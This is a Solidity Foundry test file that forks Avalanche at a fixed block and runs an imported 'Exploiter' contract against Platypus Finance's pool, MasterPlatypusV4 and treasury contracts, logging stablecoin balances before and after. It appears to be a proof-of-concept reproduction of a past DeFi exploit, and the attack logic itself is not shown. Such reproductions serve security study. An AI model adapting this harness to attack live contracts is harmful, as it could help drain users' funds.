// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/libraries/Constants.sol";
import "../src/Exploiter.sol";
import "../src/interfaces/IAaveFlashloan.sol";
import "../src/interfaces/IMasterPlatypusV4.sol";
import "../src/interfaces/IPlatypusPool.sol";
import "../src/interfaces/IPlatypusTreasure.sol";
import "../src/interfaces/CheatCodes.sol";


contract Exploit is Test {

    IERC20 USDC = IERC20(Constants.USDC);
    IERC20 USP = IERC20(Constants.USP);
    IERC20 USDC_E = IERC20(Constants.USDC_E);
    IERC20 USDT = IERC20(Constants.USDT);
    IERC20 USDT_E = IERC20(Constants.USDT_E);
    IERC20 BUSD = IERC20(Constants.BUSD);
    IERC20 DAI_E = IERC20(Constants.DAI_E);
    IERC20 LPUSDC = IERC20(Constants.LPUSDC);
    PlatypusPool Pool = PlatypusPool(Constants.PLATYPUS_POOL);
    MasterPlatypusV4 Master = MasterPlatypusV4(Constants.PLATYPUS_MASTERPLATYPUSV4);
    PlatypusTreasure Treasure = PlatypusTreasure(Constants.PLATYPUS_TREASURE);
    
    Exploiter exploiter;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 26_343_613);
        exploiter = new Exploiter(address(this));
        
    }

    function testExploit() external {
        // Logging before the attack
        logBalances(address(exploiter), "before attack");
        
        // attack
        exploiter.hello();

        // Logging after the attac;
        logBalances(address(exploiter), "after attack");
    }

    function logBalances(address _account, string memory _message) internal {
        emit log_named_decimal_uint(
            string.concat("Account USP balance ", _message), USP.balanceOf(address(_account)), USP.decimals()
        );
        emit log_named_decimal_uint(
            string.concat("Account USDC balance ", _message), USDC.balanceOf(address(_account)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            string.concat("Account USDC_E balance ", _message), USDC_E.balanceOf(address(_account)), USDC_E.decimals()
        );
        emit log_named_decimal_uint(
            string.concat("Account USDT balance ", _message), USDT.balanceOf(address(_account)), USDT.decimals()
        );
        emit log_named_decimal_uint(
            string.concat("Account USDT_E balance ", _message), USDT_E.balanceOf(address(_account)), USDT_E.decimals()
        );
        emit log_named_decimal_uint(
            string.concat("Account BUSD balance ", _message), BUSD.balanceOf(address(_account)), BUSD.decimals()
        );
        emit log_named_decimal_uint(
            string.concat("Account DAI_E balance ", _message), DAI_E.balanceOf(address(_account)), DAI_E.decimals()
        );
    }

}
